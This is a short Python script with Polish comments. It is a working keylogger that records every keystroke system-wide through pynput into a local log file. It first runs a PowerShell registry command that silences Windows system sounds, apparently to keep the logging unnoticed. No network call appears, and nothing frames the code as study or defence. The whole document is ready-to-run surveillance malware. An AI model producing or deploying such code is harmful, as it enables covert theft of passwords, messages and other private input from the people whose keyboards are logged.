import pynput
import os

# Wyłącz wszystkie dźwięki systemowe, multimedia nietknięte
os.system('powershell -c "Set-ItemProperty -Path \'HKCU:\\Control Panel\\Sound\' -Name \'Beep\' -Value \'No\'; Get-ChildItem -Path \'HKCU:\\AppEvents\\Schemes\\Apps\\.Default\' | ForEach-Object { Set-ItemProperty -Path $_.PSPath -Name \'(Default)\' -Value \'\' }"')

# Wyczyść log
with open("log.txt", "w") as f:
    f.write("")

def on_press(k):
    try:
        s = str(k).replace("'", "")
        if k == pynput.keyboard.Key.space:
            s = "[SPACE]"
        elif k == pynput.keyboard.Key.enter:
            s = "[ENTER]"
        elif k == pynput.keyboard.Key.tab:
            s = "[TAB]"
        elif k == pynput.keyboard.Key.backspace:
            s = "[BACKSPACE]"
        elif s.startswith("Key."):
            s = f"[{s.replace('Key.', '')}]"
        else:
            s = s
        # Dopisz klawisz z separatorem (spacja) dla czytelności
        with open("log.txt", "r+") as f:
            c = f.read()
            f.seek(0)
            f.write(c + s + " ")
    except:
        pass

# Odpal
with pynput.keyboard.Listener(on_press=on_press) as l:
    l.join()